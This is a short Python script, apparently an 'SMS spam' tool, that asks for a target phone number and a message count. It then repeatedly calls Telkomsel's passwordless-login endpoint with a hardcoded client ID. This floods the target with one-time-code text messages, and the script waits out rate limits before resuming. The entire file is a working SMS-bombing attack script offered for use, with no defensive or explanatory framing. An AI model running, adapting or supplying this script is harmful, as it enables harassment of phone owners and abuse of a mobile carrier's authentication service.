#!usr/bin/python3.7
#Author: mrb-in


try:
	import requests,os,time,sys
	os.system('clear')
	print("""
\t[ SPAM SMS TELKOMSEL V2 ]
\t   [ By:mrb12in ]

[ex] +628 numbers only. It does not work with USSR phone numbers and e-sim """)
	no=input("[?] Number: ")
	jml=int(input("[?] Messages: "))
	print()
	header = {'Auth0-Client':'eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiNy42LjEifQ',
	'Origin':'https://my.telkomsel.com',
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'en-US,en;q=0.9',
	'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
	'Content-Type':'application/x-www-form-urlencoded',
	'Accept':'application/json, text/javascripte',
	'Referer':'https://my.telkomsel.com/',
	'Connection':'keep-alive'}
	dat={'client_id':'Xlj9pkfK6yYumf6G8KE2S5TDWgTtczb0','phone_number':'+'+no,'connection':'sms'}
	c=int(0)
	while c < jml:
		c+=1
		atc=requests.post("https://tdwidm.telkomsel.com/passwordless/start",data=dat,headers=header)
#		print(atc.text)
		if atc.status_code == 200:
			print("["+str(c)+"] Сообщение отправлено. Sleep 0.5sec "+no)
			time.sleep(0.5)
		else:
			print("[-] Превышен лимит по сообщениям на номер "+no)
			print("[!] sleep 60s")
			c-=1
			time.sleep(60)

except KeyboardInterrupt: exit("[Exit] key interrupt")
except Exception as F:
	print("[Err] %s"%(F))
